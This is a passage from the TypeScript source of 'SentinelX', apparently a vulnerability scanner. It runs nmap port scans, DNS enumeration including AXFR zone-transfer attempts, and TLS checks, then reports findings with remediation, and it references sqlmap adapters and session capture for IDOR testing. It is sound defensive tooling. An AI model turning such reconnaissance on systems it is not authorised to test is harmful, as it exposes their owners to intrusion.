/**
 * SentinelX Professional Security Scanner — Real Tools Edition
 *
 * Uses real system security tools for professional-grade analysis:
 *   • nmap      — TCP/UDP port scanning + service version detection
 *   • dig       — DNS record enumeration (A, AAAA, MX, TXT, NS, SOA, CAA)
 *   • whois     — Domain registration, registrar, expiry intel
 *   • openssl   — TLS certificate deep inspection
 *   • fetch     — HTTP security headers, CORS, cookies, web app probes
 *   • crt.sh    — SSL certificate transparency for subdomain discovery
 *   • ipinfo.io — IP geolocation and ASN enrichment
 *   • Wayback   — Historical endpoint discovery via Wayback Machine CDX API
 *
 * All checks are non-destructive — no exploitation, no brute-forcing,
 * no data modification on targets.
 */

import * as tls from "node:tls";
import * as net from "node:net";
import * as dns from "node:dns";
import { AsyncLocalStorage } from "node:async_hooks";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);
const dnsResolve = dns.promises;
interface ScanContext {
  remaining: number;
  exhaustedNotified: boolean;
  authHeaders?: Record<string, string>;
  wafChallengeDetected: boolean;
  wafChallengeLogEmitted: boolean;
  activeProbeDepth: number;
  onWafChallenge?: () => void | Promise<void>;
  /** Session cookie captured by Phase 24 / 25 / 26 for use in Phase 28 IDOR testing. */
  capturedSession?: string;
}

const scanContext = new AsyncLocalStorage<ScanContext>();

// ═══════════════════════════════════════════════════════════════════════════════
// TYPES
// ═══════════════════════════════════════════════════════════════════════════════

export interface RealFinding {
  title: string;
  severity: "critical" | "high" | "medium" | "low";
  verification?: "verified" | "version_match" | "suspected" | "informational";
  confidence?: number;
  evidenceQuality?: "weak" | "standard" | "strong";
  verificationMethod?: string;
  reproducibility?: "reproducible" | "intermittent" | "not_reproducible" | "not_tested";
  affectedEndpoint?: string;
  affectedParameter?: string;
  negativeTests?: string;
  limitations?: string;
  toolInfo?: string;
  description: string;
  cvss: number;
  cve: string | null;
  evidence: string;
  remediation: string;
  /** Compliance mapping: OWASP Top 10 2021, PCI DSS v4.0, NIST 800-53 */
  compliance?: { owasp?: string[]; pci?: string[]; nist?: string[] };
}

export interface ScanResult {
  findings: RealFinding[];
  wafBlocked: boolean;
}

export interface Target {
  url: string;
  hostname: string;
  port: number;
  isHttps: boolean;
  assetType: string;
}

interface ProbeResult {
  status: number;
  headers: Record<string, string>;
  rawHeaders: string;
  body: string;
  finalUrl: string;
  durationMs: number;
  wafChallenge: boolean;
}

export type ScanType = "recon" | "enumeration" | "vulnerability" | "full";
export type LogFn = (msg: string) => Promise<void> | void;
export type ScanProfile = "passive" | "safe_active" | "deep_authorized" | "authenticated" | "lab";

export interface ScanPolicy {
  profile: ScanProfile;
  requestBudget: number;
  timeoutMs: number;
  maxConcurrency: number;
  allowDeepChecks: boolean;
  allowExternalCallbacks: boolean;
  allowToolAdapters: boolean;
}

export const SCAN_POLICIES: Record<ScanProfile, Omit<ScanPolicy, "profile">> = {
  passive: {
    requestBudget: 80,
    timeoutMs: 8_000,
    maxConcurrency: 2,
    allowDeepChecks: false,
    allowExternalCallbacks: false,
    allowToolAdapters: false,
  },
  safe_active: {
    requestBudget: 300,
    timeoutMs: 10_000,
    maxConcurrency: 4,
    allowDeepChecks: false,
    allowExternalCallbacks: false,
    allowToolAdapters: false,
  },
  deep_authorized: {
    requestBudget: 8_000,
    timeoutMs: 20_000,
    maxConcurrency: 10,
    allowDeepChecks: true,
    allowExternalCallbacks: true,
    allowToolAdapters: true,
  },
  authenticated: {
    requestBudget: 6_000,
    timeoutMs: 20_000,
    maxConcurrency: 10,
    allowDeepChecks: true,
    allowExternalCallbacks: true,
    allowToolAdapters: true,
  },
  lab: {
    requestBudget: 8_000,
    timeoutMs: 20_000,
    maxConcurrency: 12,
    allowDeepChecks: true,
    allowExternalCallbacks: true,
    allowToolAdapters: true,
  },
};

export function resolveScanPolicy(profile: string | undefined): ScanPolicy {
  const selected = (profile && profile in SCAN_POLICIES ? profile : "safe_active") as ScanProfile;
  return { profile: selected, ...SCAN_POLICIES[selected] };
}

export interface ToolCapability {
  name: string;
  available: boolean;
  version?: string;
  path?: string;
  reason?: string;
}

const TOOL_COMMANDS: Record<string, string> = {
  nmap: "nmap",
  dig: "dig",
  whois: "whois",
  openssl: "openssl",
  curl: "curl",
  httpx: "httpx",
  nuclei: "nuclei",
  ffuf: "ffuf",
  sqlmap: "sqlmap",
};

export async function discoverToolCapabilities(): Promise<ToolCapability[]> {
  const capabilities: ToolCapability[] = [];
  for (const [name, command] of Object.entries(TOOL_COMMANDS)) {
    try {
      const { stdout: path } = await execFileAsync("sh", ["-lc", `command -v ${command}`], { timeout: 2_000 });
      let version = "";
      try {
        const { stdout, stderr } = await execFileAsync(command, ["--version"], { timeout: 3_000 });
        version = `${stdout || stderr}`.split("\n")[0]?.trim() ?? "";
      } catch {
        version = "installed; version unavailable";
      }
      capabilities.push({ name, available: true, path: path.trim(), version });
    } catch {
      capabilities.push({ name, available: false, reason: "not installed in this environment" });
    }
  }
  return capabilities;
}

/** Reserve one target request from the active scan's explicit budget. */
export function reserveScanRequest(): boolean {
  const context = scanContext.getStore();
  if (!context) return true;
  if (context.remaining <= 0) {
    context.exhaustedNotified = true;
    return false;
  }
  context.remaining -= 1;
  return true;
}

export function remainingScanRequests(): number | null {
  return scanContext.getStore()?.remaining ?? null;
}

/** Stored authentication headers for auxiliary probe implementations. */
export function getScanAuthHeaders(): Record<string, string> {
  return scanContext.getStore()?.authHeaders ?? {};
}

/** Whether the current asset has been served a WAF challenge page. */
export function isWafChallengeDetected(): boolean {
  return scanContext.getStore()?.wafChallengeDetected ?? false;
}

/** Active probes are disabled once a WAF challenge is observed. */
export function activeProbesAllowed(): boolean {
  return !(scanContext.getStore()?.wafChallengeDetected ?? false);
}

/** Record a challenge observed by either HTTP probe implementation. */
export async function noteWafChallengeDetected(): Promise<void> {
  await recordWafChallenge();
}

/**
 * Run a check while marking all of its HTTP requests as active. Once a WAF
 * challenge is seen, the shared probe wrapper returns null for subsequent
 * active requests, while passive requests can continue.
 */
export async function runActiveChecks<T>(fn: () => Promise<T>, fallback: T): Promise<T> {
  const context = scanContext.getStore();
  if (!context || context.wafChallengeDetected) return fallback;
  context.activeProbeDepth++;
  try {
    return await fn();
  } finally {
    context.activeProbeDepth--;
  }
}

export function isWafChallengeResponse(status: number, headers: Record<string, string>): boolean {
  if (status !== 403) return false;
  const cfMitigated = (headers["cf-mitigated"] ?? "").trim().toLowerCase() === "challenge";
  const serverCloudflare = (headers["server"] ?? "").toLowerCase().includes("cloudflare");
  const cookies = (headers["set-cookie"] ?? "").toLowerCase();
  const hasCloudflareCookie = /(?:^|[,;]\s*)__(?:cf_bm)|(?:^|[,;]\s*)cf_clearance\s*=/.test(cookies) ||
    cookies.includes("__cf_bm=") || cookies.includes("cf_clearance=");
  return cfMitigated || (serverCloudflare && hasCloudflareCookie);
}

/**
 * Treat a payload as reflected only when it is not embedded in a long,
 * hexadecimal-looking token such as a CDN challenge or request identifier.
 */
export function isContextualReflection(body: string, payload: string): boolean {
  const candidates = new Set([payload]);
  try {
    candidates.add(decodeURIComponent(payload));
  } catch {
    // The original payload is still a valid candidate.
  }

  for (const candidate of candidates) {
    if (!candidate) continue;
    let offset = 0;
    while (true) {
      const position = body.indexOf(candidate, offset);
      if (position === -1) break;
      const before = body.slice(Math.max(0, position - 10), position);
      const after = body.slice(position + candidate.length, position + candidate.length + 10);
      const surrounding = `${before}${after}`;
      const hexDigits = (surrounding.match(/[0-9a-f]/gi) ?? []).length;
      const printable = [...surrounding].filter((character) => {
        const code = character.charCodeAt(0);
        return code >= 32 && code <= 126;
      }).length;
      if (
        (surrounding.length === 0 || printable / surrounding.length >= 0.8) &&
        hexDigits / Math.max(surrounding.length, 1) < 0.6
      ) return true;
      offset = position + Math.max(candidate.length, 1);
    }
  }
  return false;
}

async function recordWafChallenge(): Promise<void> {
  const context = scanContext.getStore();
  if (!context || context.wafChallengeDetected) return;
  context.wafChallengeDetected = true;
  if (!context.wafChallengeLogEmitted) {
    context.wafChallengeLogEmitted = true;
    await context.onWafChallenge?.();
  }
}

/** Store a session cookie captured by Phase 24 / 25 / 26. First write wins. */
function storeCapturedSession(cookie: string): void {
  const ctx = scanContext.getStore();
  if (ctx && !ctx.capturedSession) ctx.capturedSession = cookie;
}

/** Retrieve the session cookie captured by Phase 24 / 25 / 26, if any. */
function getCapturedSession(): string | undefined {
  return scanContext.getStore()?.capturedSession;
}

function downgradeWafChallengeFindings(findings: RealFinding[]): void {
  if (!isWafChallengeDetected()) return;
  for (const finding of findings) {
    if (finding.verification === "informational" && finding.cvss === 0) continue;
    finding.confidence = 25;
    finding.verification = "informational";
    finding.limitations = [
      finding.limitations,
      "WAF challenge response — false positive likely.",
    ].filter(Boolean).join("\n");
  }
}

function suppressWafSensitiveFindings(findings: RealFinding[]): void {
  if (!isWafChallengeDetected()) return;
  for (let index = findings.length - 1; index >= 0; index--) {
    if (/\b(?:SSTI|NoSQL)\b/i.test(findings[index].title)) {
      findings.splice(index, 1);
    }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// CORE HELPERS
// ═══════════════════════════════════════════════════════════════════════════════

export function normalizeTarget(value: string, type: string): Target | null {
  let v = value.trim().replace(/^\*\./, "");
  let raw = v;
  if (!/^https?:\/\//i.test(v)) {
    raw = type === "ip" ? `http://${v}/` : `https://${v}/`;
  }
  try {
    const u = new URL(raw);
    return {
      url: u.origin + "/",
      hostname: u.hostname,
      port: parseInt(u.port) || (u.protocol === "https:" ? 443 : 80),
      isHttps: u.protocol === "https:",
      assetType: type,
    };
  } catch {
    return null;
  }
}

const ts = () => new Date().toISOString();

async function probe(
  url: string,
  opts: {
    method?: string;
    headers?: Record<string, string>;
    body?: string;
    timeoutMs?: number;
    followRedirects?: boolean;
    /** If true, skip merging stored auth headers (e.g. for auth-probing itself) */
    skipAuth?: boolean;
    /** Active probes are suspended after a WAF challenge is detected. */
    active?: boolean;
  } = {},
): Promise<ProbeResult | null> {
  const context = scanContext.getStore();
  const isActive = opts.active ?? ((context?.activeProbeDepth ?? 0) > 0);
  if (isActive && context?.wafChallengeDetected) return null;
  if (!reserveScanRequest()) return null;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), opts.timeoutMs ?? 12_000);
  const t0 = Date.now();
  // Merge stored auth headers if authenticated scanning is enabled
  const storedAuth = (!opts.skipAuth && scanContext.getStore()?.authHeaders) ?? {};
  try {
    const res = await fetch(url, {
      method: opts.method ?? "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; SentinelX/2.0; security-scanner)",
        ...storedAuth,
        ...(opts.headers ?? {}),
      },
      body: opts.body,
      signal: controller.signal,
      redirect: opts.followRedirects === false ? "manual" : "follow",
    });
    const headers: Record<string, string> = {};
    const rawParts: string[] = [];
    res.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      headers[k] = val;
      rawParts.push(`  ${k}: ${val}`);
    });
    let body = "";
    try { body = await res.text(); } catch { /* ignore */ }
    const wafChallenge = isWafChallengeResponse(res.status, headers);
    if (wafChallenge) await noteWafChallengeDetected();
    return {
      status: res.status,
      headers,
      rawHeaders: rawParts.join("\n"),
      body: body.slice(0, 10_000),
      finalUrl: res.url || url,
      durationMs: Date.now() - t0,
      wafChallenge,
    };
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// 1. DNS ENUMERATION — using dig for real DNS records
// ═══════════════════════════════════════════════════════════════════════════════

async function digQuery(hostname: string, type: string): Promise<string[]> {
  try {
    const { stdout } = await execFileAsync(
      "dig",
      ["+short", "+timeout=5", "+tries=2", hostname, type],
      { timeout: 12_000 },
    );
    return stdout
      .trim()
      .split("\n")
      .map((l) => l.trim())
      .filter(Boolean);
  } catch {
    return [];
  }
}

async function checkDns(hostname: string, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];

  await onLog(`[${ts()}] Running DNS enumeration with dig...`);

  // ── A / AAAA records ──────────────────────────────────────────────────────
  const aRecords = await digQuery(hostname, "A");
  const aaaaRecords = await digQuery(hostname, "AAAA");
  const allIPs = [...aRecords, ...aaaaRecords];
  if (allIPs.length > 0) {
    await onLog(`[${ts()}] Resolved IPs: ${allIPs.join(", ")}`);
  } else {
    await onLog(`[${ts()}] WARNING: ${hostname} did not resolve to any IP address`);
  }

  // ── NS records ────────────────────────────────────────────────────────────
  const nsRecords = await digQuery(hostname, "NS");
  await onLog(`[${ts()}] Nameservers: ${nsRecords.join(", ") || "(none)"}`);

  // ── MX records ────────────────────────────────────────────────────────────
  const mxRecords = await digQuery(hostname, "MX");
  if (mxRecords.length === 0) {
    findings.push({
      title: "No MX Records Configured",
      severity: "low",
      description: `No MX records found for ${hostname}. This may indicate email is not used, or misconfigured, leaving the domain more susceptible to email-based spoofing when SPF/DMARC are absent.`,
      cvss: 3.1, cve: null,
      evidence: `dig +short ${hostname} MX → (no results)`,
      remediation: "If email is used for this domain, configure MX records pointing to your mail provider. If email is intentionally unused, publish an SPF record of 'v=spf1 -all' and DMARC with p=reject to prevent spoofing.",
    });
  }

  // ── TXT records — SPF, DMARC, DKIM ───────────────────────────────────────
  const txtRecords = await digQuery(hostname, "TXT");
  const allTxt = txtRecords.map((r) => r.replace(/^"|"$/g, ""));
  await onLog(`[${ts()}] TXT records found: ${allTxt.length}`);

  const spf = allTxt.find((r) => r.startsWith("v=spf1"));
  if (!spf) {
    findings.push({
      title: "Missing SPF Record — Email Spoofing Risk",
      severity: "medium",
      description: `No SPF (Sender Policy Framework) TXT record found for ${hostname}. Without SPF, any mail server can send email claiming to be from this domain, enabling phishing attacks against customers and partners.`,
      cvss: 6.5, cve: null,
      evidence: `dig +short ${hostname} TXT → no v=spf1 record\nAll TXT: ${allTxt.slice(0, 5).join(" | ") || "(none)"}`,
      remediation: 'Publish: "v=spf1 include:your-mail-provider.com -all". Use -all (hard fail) to reject unauthorised senders.',
    });
  } else if (spf.includes("+all")) {
    findings.push({
      title: "SPF Record Permits Any Sender (+all)",
      severity: "high",
      description: "SPF record ends with +all, authorising every mail server in the world to send as this domain. This makes the SPF record useless and enables trivial phishing.",
      cvss: 7.5, cve: null,
      evidence: `SPF record: ${spf}`,
      remediation: "Replace +all with -all to hard-reject unauthorised senders.",
    });
  } else if (spf.includes("~all")) {
    findings.push({
      title: "SPF Record Uses Soft Fail (~all) — Weak Protection",
      severity: "low",
      description: "SPF ~all marks unauthorised senders as suspicious but does not reject them. Many mail servers accept soft-fail messages.",
      cvss: 3.7, cve: null,
      evidence: `SPF record: ${spf}`,
      remediation: "Change ~all to -all for hard rejection of unauthorised senders.",
    });
  }

  // ── DMARC ─────────────────────────────────────────────────────────────────
  const dmarcTxt = await digQuery(`_dmarc.${hostname}`, "TXT");
  const dmarc = dmarcTxt.map((r) => r.replace(/"/g, "")).find((r) => r.startsWith("v=DMARC1"));
  if (!dmarc) {
    findings.push({
      title: "Missing DMARC Record — No Email Authentication Policy",
      severity: "medium",
      description: `No DMARC record at _dmarc.${hostname}. Without DMARC, recipients cannot automatically reject spoofed emails and you receive no reports about spoofing attempts.`,
      cvss: 6.5, cve: null,
      evidence: `dig +short _dmarc.${hostname} TXT → no v=DMARC1 record`,
      remediation: `Start with monitoring: "v=DMARC1; p=none; rua=mailto:dmarc@${hostname}". Escalate to p=quarantine then p=reject once mail flow is confirmed.`,
    });
  } else {
    const pMatch = dmarc.match(/p=(\w+)/i);
    const policy = pMatch?.[1]?.toLowerCase() ?? "none";
    if (policy === "none") {
      findings.push({
        title: "DMARC Policy Is 'none' — Spoofed Emails Reach Inboxes",
        severity: "medium",
        description: "DMARC p=none only generates reports; spoofed emails are still delivered. This is a monitoring-only configuration that provides no active protection.",
        cvss: 5.3, cve: null,
        evidence: `DMARC record: ${dmarc}`,
        remediation: "Escalate DMARC policy to p=quarantine then p=reject after reviewing rua reports to confirm legitimate mail is not affected.",
      });
    } else {
      await onLog(`[${ts()}] DMARC policy: ${policy} (OK)`);
    }
  }

  // ── CAA records ───────────────────────────────────────────────────────────
  const caaRecords = await digQuery(hostname, "CAA");
  if (caaRecords.length === 0) {
    findings.push({
      title: "No CAA Records — Any CA Can Issue Certificates",
      severity: "low",
      description: `No Certification Authority Authorisation (CAA) DNS records found for ${hostname}. Without CAA, any publicly trusted CA can issue SSL certificates for this domain, enabling mis-issuance attacks.`,
      cvss: 3.7, cve: null,
      evidence: `dig +short ${hostname} CAA → (no results)`,
      remediation: `Add CAA records to restrict certificate issuance:\n${hostname}. CAA 0 issue "letsencrypt.org"\n${hostname}. CAA 0 issuewild "letsencrypt.org"\n${hostname}. CAA 0 iodef "mailto:security@${hostname}"`,
    });
  } else {
    await onLog(`[${ts()}] CAA records: ${caaRecords.join(", ")}`);
  }

  // ── Zone transfer attempt ──────────────────────────────────────────────────
  if (nsRecords.length > 0) {
    const ns = nsRecords[0]!.replace(/\.$/, "");
    try {
      const { stdout } = await execFileAsync(
        "dig",
        ["AXFR", hostname, `@${ns}`, "+time=5"],
        { timeout: 12_000 },
      );
      if (stdout.includes("Transfer failed") || stdout.includes("REFUSED") || stdout.includes("SERVFAIL")) {
        await onLog(`[${ts()}] Zone transfer refused by ${ns} (expected)`);
      } else if (stdout.split("\n").length > 15) {
        findings.push({
          title: "DNS Zone Transfer Allowed — Full Zone Exposed",
          severity: "high",
          description: `The nameserver ${ns} allows unauthenticated DNS zone transfers (AXFR). This exposes the complete DNS zone, revealing all subdomains, internal IPs, mail servers, and infrastructure topology.`,
          cvss: 7.5, cve: null,
          evidence: `dig AXFR ${hostname} @${ns}\nResponse contained ${stdout.split("\n").length} lines of zone data`,
          remediation: "Configure the nameserver to refuse AXFR requests from unauthorised IPs. Zone transfers should only be allowed to authorised secondary nameservers. In BIND: allow-transfer { none; };",
        });
      }
    } catch { /* timeout or no access — expected */ }
  }

  await onLog(`[${ts()}] DNS enumeration complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 2. PORT SCANNING — using real nmap with service detection
// ═══════════════════════════════════════════════════════════════════════════════

interface NmapService {
  port: number;
  protocol: string;
  state: string;
  service: string;
  version: string;
}

async function nmapScan(hostname: string, portRange: string, onLog: LogFn): Promise<NmapService[]> {
  await onLog(`[${ts()}] nmap -sV -p ${portRange} ${hostname} ...`);
  try {
    const { stdout } = await execFileAsync(
      "nmap",
      [
        "-sV",          // service version detection
        "-sT",          // TCP connect scan (works without root)
        "-p", portRange,
        "--open",       // only show open ports
        "-T4",          // aggressive timing
        "--max-retries", "2",
        // Keep a complete requested port range, but do not let one filtered
        // host monopolize the worker. Nmap still performs the full scan and
        // returns partial results when this bounded host timeout is reached.
        "--host-timeout", "45s",
        "-oG", "-",     // grepable output for parsing
        hostname,
      ],
      { timeout: 60_000 },
    );

    const services: NmapService[] = [];
    for (const line of stdout.split("\n")) {
      // Parse grepable format: Ports: 22/open/tcp//ssh//OpenSSH 8.4/
      const portsMatch = line.match(/Ports:\s+(.+)/);
      if (!portsMatch) continue;
      const portEntries = portsMatch[1]!.split(",");
      for (const entry of portEntries) {
        const parts = entry.trim().split("/");
        if (parts.length >= 3 && parts[1] === "open") {
          services.push({
            port: parseInt(parts[0]!),
            protocol: parts[2] ?? "tcp",
            state: parts[1],
            service: parts[4] ?? "",
            version: parts[6] ?? "",
          });
        }
      }
    }
    await onLog(`[${ts()}] nmap found ${services.length} open port(s)`);
    return services;
  } catch (err: any) {
    await onLog(`[${ts()}] nmap scan error: ${err?.message ?? String(err)}`);
    return [];
  }
}

// Risk classifications for common exposed services
const SERVICE_RISKS: Record<string, { severity: "critical"|"high"|"medium"|"low"; cvss: number; cve: string|null; description: string; remediation: string }> = {
  "ftp":      { severity: "high",     cvss: 7.5, cve: null, description: "FTP service is publicly exposed. FTP transmits credentials and data in plaintext, making it trivially interceptable. Anonymous FTP access may allow file read/write without authentication.", remediation: "Replace FTP with SFTP or FTPS. Restrict access to known IPs via firewall. Audit for anonymous access and disable it immediately." },
  "telnet":   { severity: "critical", cvss: 9.8, cve: null, description: "Telnet is exposed to the internet. Telnet transmits all data, including passwords, in plaintext. It is completely insecure over untrusted networks.", remediation: "Replace Telnet with SSH immediately. Block port 23 at the firewall. Disable the Telnet daemon." },
  "smtp":     { severity: "medium",   cvss: 5.3, cve: null, description: "SMTP relay port is directly exposed. An open relay allows anyone to send email through this server, enabling spam abuse and domain reputation damage.", remediation: "Restrict SMTP to authenticated users only. Disable open relay. Consider moving to a managed email service." },
  "rdp":      { severity: "high",     cvss: 7.5, cve: null, description: "Remote Desktop Protocol is exposed to the internet. RDP is heavily targeted for ransomware delivery and brute-force attacks, but an open port alone does not prove a specific RDP CVE or remote code execution.", remediation: "Block port 3389 from the internet. Require VPN before RDP is accessible. Enable Network Level Authentication and apply current Windows patches." },
  "smb":      { severity: "high",     cvss: 7.5, cve: null, description: "SMB (Windows file sharing) is exposed to the internet. Public SMB increases brute-force, relay, and legacy-protocol risk, but an open port alone does not prove EternalBlue or remote code execution.", remediation: "Block TCP 445 from the internet unconditionally. Use VPN for internal file sharing and disable legacy SMB protocols." },
  "mysql":    { severity: "critical", cvss: 9.4, cve: null, description: "MySQL database port is directly accessible from the internet. Any unauthenticated actor can attempt to brute-force credentials or exploit unpatched vulnerabilities.", remediation: "Bind MySQL to 127.0.0.1. Remove all remote root accounts. Block port 3306 at the firewall." },
  "postgres": { severity: "critical", cvss: 9.4, cve: null, description: "PostgreSQL is directly accessible from the internet. Exposed database ports are continuously scanned and attacked.", remediation: "Bind PostgreSQL to localhost. Block port 5432 at the firewall. Use SSH tunnels or VPN for remote DB access." },
  "mongodb":  { severity: "critical", cvss: 9.8, cve: null, description: "MongoDB is publicly accessible. Default MongoDB installations have no authentication. Millions of MongoDB instances have been ransomed via this misconfiguration.", remediation: "Enable MongoDB authentication. Bind to 127.0.0.1. Block port 27017 at the firewall." },
  "redis":    { severity: "critical", cvss: 9.8, cve: null, description: "Redis is exposed to the internet. Redis has no authentication by default and can be used to read/write arbitrary data, enabling server takeover.", remediation: "Bind Redis to 127.0.0.1. Set a requirepass in redis.conf. Block port 6379 at the firewall." },
  "elasticsearch": { severity: "critical", cvss: 9.8, cve: null, description: "Elasticsearch REST API is publicly accessible. Unauthenticated access allows reading and deleting all indexed data.", remediation: "Enable X-Pack security. Require authentication. Bind to internal networks only." },
  "ssh":      { severity: "medium",   cvss: 5.3, cve: null, description: "SSH is exposed to the internet. While SSH is often intentionally public, exposed SSH is continuously brute-forced. Default configurations may allow password authentication.", remediation: "Disable password authentication — use SSH key pairs only. Change to a non-standard port or use port knocking. Implement fail2ban or equivalent. Restrict to known source IPs if possible." },
  "vnc":      { severity: "critical", cvss: 9.8, cve: null, description: "VNC (remote desktop) is publicly accessible. VNC protocols may have weak or no authentication and are a common ransomware entry point.", remediation: "Block VNC ports from the internet. Require VPN access. Enforce strong VNC authentication." },
  "docker":   { severity: "critical", cvss: 10.0, cve: null, description: "Docker daemon API is exposed without TLS. Full root-equivalent control over the host: create privileged containers, mount the host filesystem, execute arbitrary commands as root.", remediation: "Disable remote Docker API. If required, use TLS client auth (--tlsverify). Block ports 2375/2376 at the firewall." },
  "kubernetes": { severity: "critical", cvss: 10.0, cve: null, description: "Kubernetes API server is publicly accessible. Unauthenticated access to the Kubernetes API allows full cluster takeover.", remediation: "Restrict API server to authorised IPs. Require authentication. Disable anonymous access." },
  "memcached": { severity: "high",    cvss: 7.5, cve: null, description: "Memcached is publicly accessible. Unauthenticated access allows reading/flushing cached data. Exposed Memcached servers are also abused for amplification DDoS attacks.", remediation: "Bind Memcached to 127.0.0.1. Block port 11211 at the firewall." },
};

async function checkPorts(hostname: string, scanType: ScanType, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];

  // Port range depends on scan type
  const portRange = scanType === "full"
    ? "1-65535"
    : scanType === "vulnerability"
    ? "1-10000"
    : "21,22,23,25,80,443,445,1433,1521,2375,2376,3306,3389,4848,5432,5601,5900,5984,6379,7001,8080,8443,8888,9200,9300,10000,11211,27017,28017,50000";

  const services = await nmapScan(hostname, portRange, onLog);

  for (const svc of services) {
    // Log every open port
    await onLog(`[${ts()}] OPEN PORT ${svc.port}/${svc.protocol} — ${svc.service} ${svc.version}`.trim());

    // Match to known risky services
    const svcName = svc.service.toLowerCase();
    let matched = false;
    for (const [key, risk] of Object.entries(SERVICE_RISKS)) {
      if (svcName.includes(key) || (key === "smb" && svc.port === 445) || (key === "rdp" && svc.port === 3389) || (key === "docker" && (svc.port === 2375 || svc.port === 2376))) {
        findings.push({
          title: `Exposed Service: ${svc.service || key.toUpperCase()} on Port ${svc.port}/${svc.protocol}`,
          severity: risk.severity,
          description: risk.description,
          cvss: risk.cvss,
          cve: risk.cve,
          evidence: `nmap detected open port ${svc.port}/${svc.protocol}\nService: ${svc.service} ${svc.version}\nHost: ${hostname}`,
          remediation: risk.remediation,
        });
        matched = true;
        break;
      }
    }

    // Generic finding for any unexpected open port
    if (!matched && ![80, 443, 8080, 8443].includes(svc.port)) {
      findings.push({
        title: `Unexpected Open Port: ${svc.port}/${svc.protocol} (${svc.service || "unknown"})`,
        severity: "low",
        description: `Port ${svc.port}/${svc.protocol} is open and accessible from the internet. Service detected: ${svc.service || "unknown"} ${svc.version}. Every exposed service increases the attack surface.`,
        cvss: 3.7, cve: null,
        evidence: `nmap: ${svc.port}/${svc.protocol} open — ${svc.service} ${svc.version}`,
        remediation: `If this service is not intended to be publicly accessible, block port ${svc.port} at the firewall. If it must be public, ensure it is fully patched and using strong authentication.`,
      });
    }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 3. TLS / SSL ANALYSIS — openssl s_client + node:tls
// ═══════════════════════════════════════════════════════════════════════════════

async function opensslTlsInfo(hostname: string, port: number): Promise<string> {
  try {
    // Use printf to send a quick close so openssl doesn't hang
    const { stdout } = await execFileAsync(
      "openssl",
      ["s_client", "-connect", `${hostname}:${port}`, "-servername", hostname, "-brief", "-no_ign_eof"],
      { timeout: 12_000 },
    );
    return stdout;
  } catch (err: any) {
    return err?.stdout ?? "";
  }
}

async function checkTls(hostname: string, port: number, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Running openssl TLS analysis on ${hostname}:${port}...`);

  // ── openssl-based cert inspection ────────────────────────────────────────
  const opensslOut = await opensslTlsInfo(hostname, port);
  if (opensslOut) {
    await onLog(`[${ts()}] openssl connected — parsing certificate chain...`);
  }

  // ── node:tls for detailed checks ─────────────────────────────────────────
  const certResult = await new Promise<RealFinding[]>((resolve) => {
    const f: RealFinding[] = [];
    const socket = tls.connect(
      { host: hostname, port, servername: hostname, rejectUnauthorized: false, timeout: 12_000 },
      async () => {
        try {
          const cert = socket.getPeerCertificate(true);
          const proto = socket.getProtocol() ?? "unknown";
          const cipher = socket.getCipher();
          socket.destroy();

          // Deprecated TLS versions
          if (proto === "TLSv1" || proto === "TLSv1.0") {
            f.push({
              title: "Deprecated TLS 1.0 Protocol Supported",
              severity: "high",
              description: "The server supports TLS 1.0, deprecated by PCI DSS in 2018 and by the IETF in RFC 8996. TLS 1.0 is vulnerable to BEAST, POODLE, and downgrade attacks.",
              cvss: 7.4, cve: null,
              evidence: `openssl/TLS negotiation succeeded with protocol: ${proto}\nCipher: ${cipher?.name ?? "unknown"}`,
              remediation: "Disable TLS 1.0 and 1.1. Support only TLS 1.2 and 1.3. Nginx: ssl_protocols TLSv1.2 TLSv1.3;",
            });
          } else if (proto === "TLSv1.1") {
            f.push({
              title: "Deprecated TLS 1.1 Protocol Supported",
              severity: "medium",
              description: "Server supports TLS 1.1, deprecated in RFC 8996. Lacks modern cipher suites and is vulnerable to padding oracle attacks.",
              cvss: 5.9, cve: null,
              evidence: `Protocol: ${proto}\nCipher: ${cipher?.name ?? "unknown"}`,
              remediation: "Disable TLS 1.1. Support only TLS 1.2 and TLS 1.3.",
            });
          } else {
            f.push({
              title: `TLS Configuration: ${proto}`,
              severity: "low",
              description: `Server negotiated ${proto} with cipher ${cipher?.name ?? "unknown"}. Modern protocol in use.`,
              cvss: 0, cve: null,
              evidence: `Protocol: ${proto}\nCipher suite: ${cipher?.name ?? "unknown"}\nCipher bits: ${cipher?.version ?? "unknown"}`,
              remediation: "Continue monitoring cipher suite configuration. Prioritise ECDHE and AES-GCM cipher suites for forward secrecy.",
            });
          }

          // Weak ciphers
          const cipherName = cipher?.name?.toUpperCase() ?? "";
          if (cipherName.match(/RC4|DES|NULL|EXPORT|ANON|3DES/)) {
            f.push({
              title: `Weak Cipher Suite Negotiated: ${cipher?.name}`,
              severity: "high",
              description: `Server negotiated a weak cipher (${cipher?.name}). RC4, DES, 3DES, EXPORT, NULL and ANON ciphers provide insufficient protection and can be broken.`,
              cvss: 7.4, cve: null,
              evidence: `Cipher: ${cipher?.name}\nProtocol: ${proto}`,
              remediation: "Configure only modern cipher suites with forward secrecy. Remove all RC4, DES, 3DES, NULL, EXPORT and ANON ciphers.",
            });
          }

          if (!cert || !cert.valid_to) { resolve(f); return; }

          // Self-signed
          const selfSigned = cert.issuer?.CN === cert.subject?.CN && cert.issuer?.O === cert.subject?.O;
          if (selfSigned) {
            f.push({
              title: "Self-Signed SSL Certificate",
              severity: "medium",
              description: `Certificate for ${hostname} is self-signed. Browsers show blocking warnings and users cannot verify server identity, enabling MITM attacks.`,
              cvss: 5.9, cve: null,
              evidence: `Subject: CN=${cert.subject?.CN ?? hostname}\nIssuer: CN=${cert.issuer?.CN ?? "self"}\nSerial: ${cert.serialNumber ?? "unknown"}\nValid to: ${cert.valid_to}`,
              remediation: "Replace with a certificate from a trusted CA. Let's Encrypt provides free auto-renewing certificates.",
            });
          }

          // Expiry
